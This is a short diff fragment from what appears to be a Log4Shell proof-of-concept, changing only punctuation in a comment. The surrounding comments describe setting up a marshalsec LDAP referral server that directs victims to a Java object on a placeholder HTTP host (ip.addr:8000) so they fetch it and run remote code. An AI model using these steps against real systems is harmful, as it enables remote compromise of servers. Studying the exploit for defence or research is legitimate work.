@@ -1,4 +1,4 @@
-// point the ldap referral server to this Java object using http.server to initiate remote code execution
+// point the ldap referral server to this Java object using http.server to initiate remote code execution.
 // if you have installed marshallsec ldap referral use the following in your terminal
 // java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ip.addr:8000/#log4j"
 // initiate exploit with the following in another terminal
